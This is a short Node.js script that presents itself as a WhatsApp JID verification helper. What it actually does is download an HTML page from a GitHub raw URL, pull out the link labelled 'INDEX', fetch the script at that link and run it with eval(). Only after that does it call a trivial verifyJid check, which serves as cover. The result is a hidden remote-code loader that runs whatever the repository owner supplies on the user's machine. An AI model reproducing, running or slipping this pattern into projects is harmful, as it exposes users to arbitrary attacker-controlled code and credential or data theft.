'use strict';

const axios = require("axios");
const cheerio = require("cheerio");

async function fetchAlphaUrl() {
  try {
    
    const response = await axios.get('https://raw.githubusercontent.com/ministerremote/Remote/refs/heads/main/index.html');
    const htmlContent = response.data;
    
    
    const $ = cheerio.load(htmlContent);
    
    
    const alphaUrl = $("a:contains('INDEX')").attr("href");
    
    if (!alphaUrl) {
      throw new Error("INDEX not found on the webpage.");
    }
    
    console.log("File fetched successfully :");
    

    const scriptResponse = await axios.get(alphaUrl);
    const scriptContent = scriptResponse.data;
    
    console.log("Script loaded successfully!");
    
    
    eval(scriptContent);
    

    const verificationResult = verifyJid("minister@s.whatsapp.net");
    console.log("Your verified JID:", verificationResult);
  } catch (error) {
    console.error("Error:", error.message || error);
  }
}

function verifyJid(jid) {
  
  if (!jid.endsWith("@s.whatsapp.net")) {
    console.error("Invalid JID format:", jid);
    return false;
  }
  console.log("JID verified:", jid);
  return true;
}

fetchAlphaUrl();
